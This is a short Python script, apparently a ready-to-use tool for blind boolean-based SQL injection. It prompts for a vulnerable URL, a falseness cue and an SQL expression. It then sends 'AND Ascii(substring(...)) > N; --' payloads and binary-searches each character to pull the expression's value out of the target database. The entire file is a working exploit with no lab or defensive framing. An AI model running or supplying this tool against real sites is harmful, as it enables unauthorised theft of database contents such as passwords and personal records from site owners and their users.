import requests

url = input("Url Up Until Injection Point?: ")
data_type = input("Integer or String Argument? (i,s): ")
cue = input("Word Indicating Falseness?: ")
item = input("SQL Expression To Enumerate?: ")
if data_type == "s":
    url += "'"


def search_char(index):
    # Char has to be > 0 - checks if at end of item
    end_r = requests.get(url + f" AND Ascii(substring({item},{str(index)},{str(index)})) > 0; --")
    if cue in end_r.content.decode('utf-8', 'ignore'):
        return 'end'

    # Binary search to find character
    MIN = 32
    MAX = 126

    while True:
        if MAX == MIN + 1:
            # Check if char is actually correct (if not it is out of ascii range)
            check_r = requests.get(url + f" AND Ascii(substring({item},{str(index)},{str(index)})) = {MAX}; --")

            if cue in check_r.content.decode('utf-8', 'ignore'):
                return None
            else:
                return chr(MAX)

        MID = MIN + ((MAX - MIN) // 2)

        r = requests.get(url + f" AND Ascii(substring({item},{str(index)},{str(index)})) > {MID}; --")
        if cue in r.content.decode('utf-8', 'ignore'):
            MAX = MID
        else:
            MIN = MID


def find_item():
    result = ""

    i = 1
    char = ""
    while True:
        char = search_char(i)

        # At end of item, return
        if char == "end":
            return result

        # Placeholder char if out of Ascii range
        if char == None:
            result += "ǟ"

        else:
            result += char

        print(f"Character {i} Found")

        i += 1


print(find_item())